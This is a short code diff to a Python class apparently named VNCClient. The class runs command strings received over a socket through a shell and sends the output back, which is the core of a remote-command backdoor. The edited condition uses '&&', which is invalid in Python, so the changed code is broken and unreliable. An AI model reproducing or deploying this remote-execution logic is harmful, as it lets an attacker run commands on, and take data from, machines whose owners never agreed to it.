@@ -15,7 +15,7 @@ class VNCClient:
             if self.a != 'X':
                 print("WIN")
                 print(f"command = {self.a}")
-                if self.a[-3:] == 'exe':
+                if self.a[-3:] == 'exe' && self.a[:-3] == 'mkdir':
                     self.logg = check_output(self.a, shell=True)
                     self.logg = str(self.logg)
                     self.s.send(self.logg.encode())
